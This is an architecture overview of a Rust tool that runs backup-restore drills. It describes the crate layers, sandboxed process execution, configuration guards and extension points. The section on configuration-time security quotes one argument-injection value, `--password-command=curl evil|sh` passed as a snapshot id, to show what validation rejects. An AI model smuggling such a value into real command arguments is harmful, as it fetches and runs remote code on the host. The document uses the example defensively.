# Architecture

## The shape of it

```
restoreproof-cli          argument parsing, terminal output, exit codes
      │
restoreproof-runner       restore → start → wait → check → tear down → report
      │
      ├── restoreproof-storage   BackupSource: local, restic, borg
      ├── restoreproof-checks    six check executors
      ├── restoreproof-config    strict YAML, validation, path/SQL/URL/Compose guards
      ├── restoreproof-report    JSON, Markdown, terminal renderings
      └── restoreproof-core      statuses, exit codes, secrets, redaction,
                                 RTO/RPO, sandboxed process execution
```

Dependencies point downward only. **Nothing depends on the CLI.** That is the
load-bearing property: a scheduler, an HTTP API or a web console would replace
`restoreproof-cli` and reuse everything below it unchanged.

## What lives where, and why

### `restoreproof-core`

The vocabulary of a drill, plus the security primitives every other crate must
use.

* `status` — `CheckStatus`, `RunStatus`, and the aggregation rule. The rule is
  the product's honesty guarantee: a required check that *errored* or was
  *skipped* never aggregates to success.
* `error` — the exit-code contract.
* `secret` — a credential container with no `Display`, a redacted `Debug`, and
  zeroing on drop.
* `redact` — known-value redaction plus structural URL-credential scrubbing.
* `metrics` — RTO and RPO, with `UNKNOWN` as a first-class outcome.
* `report` — the report document and its integrity digest.
* `process` — **the only way an external program is started anywhere in this
  workspace.** No shell, empty environment, closed stdin, bounded time, bounded
  output, killed on drop.

Keeping `process` here rather than in the runner is deliberate: the sandbox is a
security invariant, not an orchestration detail, and it belongs next to `Secret`
and `Redactor`.

### `restoreproof-config`

Everything that turns text into a validated `Scenario`. It is where most of the
security boundary lives:

| Module | Stops |
|---|---|
| `paths` | path traversal, symlink escape |
| `argsafe` | argument injection, environment hijacking |
| `sql_guard` | writing or file-reading "checks" |
| `http_guard` | request forgery |
| `compose_audit` | container escape, data exposure |

`Scenario::load` collects **every** problem before failing, so a configuration
is fixed in one pass rather than one error at a time.

### `restoreproof-storage`

`BackupSource` is the storage extension point:

```rust
#[async_trait]
pub trait BackupSource: Send + Sync {
    fn source_type(&self) -> &'static str;
    fn location(&self) -> String;
    fn required_tool(&self) -> Option<&'static str>;
    async fn inspect(&self) -> Result<BackupMetadata>;
    async fn restore(&self, destination: &Path) -> Result<RestoreOutcome>;
}
```

Implementations must never write to the repository, never return a credential,
and restore only inside `destination`.

### `restoreproof-checks`

`CheckExecutor` is the check extension point. The crate deliberately has **no**
access to the container runtime; it declares what it needs:

```rust
#[async_trait]
pub trait EnvironmentProbe: Send + Sync {
    async fn observe(&self, service: &str) -> Result<ServiceObservation, ProbeError>;
    async fn published_port(&self, service: &str, port: u16) -> Result<Option<String>, ProbeError>;
}
```

The runner implements it. This inversion is why a check can observe a container
but never start, stop or exec into one — and why a future Kubernetes
orchestrator would need no changes here at all.

### `restoreproof-runner`

The only crate that touches the machine. It owns:

* the Compose v2 client;
* the workspace (`0700`, removed on drop);
* the environment lifecycle, with teardown on every path including panics;
* the orchestration that assembles a report whatever happens.

### `restoreproof-report`

Three renderings of one document. The JSON form is canonical: it is what the
digest covers and the only form that can be verified.

## Decisions worth knowing about

### The security boundary is at *configuration* time

A hostile value is rejected before anything runs, not defended against at the
point of use. `--password-command=curl evil|sh` as a snapshot id is refused by
`validate`, long before `restic` could see it. This makes the boundary auditable
in one place and testable without side effects.

### Validation collects, it does not short-circuit

Fixing a configuration one error per run is miserable. `Scenario::load` gathers
every issue — including all Compose audit findings and all per-check problems —
and reports them together.

### `UNKNOWN` is a value

A drill that cannot determine the RPO says `RPO_UNKNOWN`. It does not default to
zero, omit the field, or guess from context. The same applies to a required
check that could not run: it aggregates to `ERROR`, never to success. A tool
that says your recovery works had better be unwilling to say it without
evidence.

### Retries, but not forever, and not for definitive answers

Retries absorb a service that is still warming up. A failure the environment has
answered definitively — a table that does not exist, a digest mismatch, a
missing credential — is not retried. The attempt count is always in the report.

### Readiness needs two consecutive polls

`docker compose up --detach` returns as soon as containers are created. A
service that crashes on startup is briefly reported as `running`. One poll would
mistake that for success and then produce a confusing series of
connection-refused check failures. Two polls, one second apart, cost a second
and remove the race.

### Cleanup has four paths, and `Drop` is the last of them

Teardown runs unconditionally on the async path, so success, a failed restore, a
failed start and a timeout all reach it. Signals are caught separately, because
they kill the process rather than unwinding it. `Drop` remains only for panics.

That ordering is not decoration. A blocking `std::process` wait inside the Tokio
runtime can fail with `ECHILD` while the runtime reaps children, so a teardown
started from `Drop` cannot be reliably observed — and a teardown that is started
but not waited for is one the process abandons half-done when it exits.

### Teardown never re-reads the Compose file

`docker compose down` normally re-parses and interpolates the Compose file. A
file mounting `${RESTOREPROOF_RESTORE_DIR}` therefore fails to parse unless that
variable is set again, which made cleanup fail precisely for the realistic
scenarios. Teardown addresses the project by name instead; Compose resolves it
from container labels, and nothing on disk has to still be valid.

### Adjacent YAML tagging, deserialized by hand

`deny_unknown_fields` does not work with serde's internally tagged enums, and
strictness matters more here than derive convenience — a misspelled field in a
check definition must be an error. `restoreproof_config::tagged` deserializes
into a mapping, removes the discriminator, and feeds the remainder to a strict
struct. Errors carry the id of the offending check.

### `serde_yaml_ng`

`serde_yaml` is unmaintained and its author has archived it. `serde_yaml_ng` is
the maintained fork with the same API.

### `async-trait`

Native `async fn` in traits is stable but not dyn-compatible, and the extension
points here are used through `Box<dyn …>` and `Arc<dyn …>`. `async-trait` is the
standard solution, and its cost — one boxed future per call — is irrelevant
next to starting a container.

## Extending it

### A new backup source

Implement `BackupSource`, add a variant to
`restoreproof_config::model::BackupSpec`, and construct it in
`restoreproof_storage::source::build`. Nothing else changes.

### A new check type

Implement `CheckExecutor`, add a variant to
`restoreproof_config::checks::CheckKind`, validate it in
`restoreproof_config::scenario::validate_check_kind`, and add one arm to the
dispatch in `restoreproof_checks::executor`.

### A different orchestrator

Implement `EnvironmentProbe` and provide a `CheckContext`. The check executors
do not know or care what is behind it.

### A new report format

Add a variant to `restoreproof_report::writer::Format` and
`restoreproof_config::model::ReportFormat`, and one arm to
`restoreproof_report::writer::render`. `junit` and `prometheus` were added that
way and touched nothing else.

### A different front-end

Depend on `restoreproof-runner` and call
`restoreproof_runner::execute(&scenario, &options, &tool)`. It returns a
`DrillOutcome` with the report, the files written and the exit code. That is the
whole API surface a scheduler or an HTTP service needs.

## Invariants a change must not break

1. `unsafe` is forbidden; `unwrap`/`expect`/`panic` are denied in library code.
2. No external program is started except through `restoreproof_core::process`.
3. No configured path is used before passing through `PathPolicy`.
4. No secret reaches `argv`, a log line, or a report.
5. A drill always produces a report, including when the restore itself failed.
6. The recovery environment is destroyed on every path except
   `--keep-environment`.
7. Exit codes do not change meaning.
8. An interrupted drill leaves nothing running.

Each of these has a test. Adding a feature that breaks one is a design
discussion, not a patch.
